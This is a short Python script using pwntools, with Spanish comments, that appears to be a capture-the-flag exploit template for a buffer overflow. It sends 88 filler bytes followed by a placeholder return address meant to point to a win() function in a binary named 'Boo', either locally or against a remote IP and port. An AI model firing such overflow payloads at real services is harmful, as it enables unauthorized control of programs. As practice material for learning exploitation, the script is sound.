from pwn import *

Local = True # Cambia esto a False si vas a explotar el servicio remoto

# Dirección y puerto a donde te quieres conectar
ip = 'Pon tu IP AQUI'  # Cambia esto la IP donde está el servicio
port = 65534       # Cambia esto por el puerto corrrecto

# Crear la conexión local o remota al servicio
if Local == True:
    p = process('./Boo')
else:
    if Local == False:
        p = remote(ip, port)
    else:
        print("Calmbia Local a True o False")

# Creación del payload
payload = b'A' * 88  # 88 bytes para llenar el buffer
payload += p64(0x000000)  # Dirección de la función win() (esto debe ser la dirección correcta en tu binario)

# Enviar el payload cuando se recibe el mensaje de "Introduce tu mensaje:"
p.sendlineafter(b"Introduce tu mensaje:", payload)

# Recibir toda la salida después de enviar el payload
output = p.recvall()

# Imprimir la salida completa
print(output.decode())
# Cerrar la conexión
p.close()
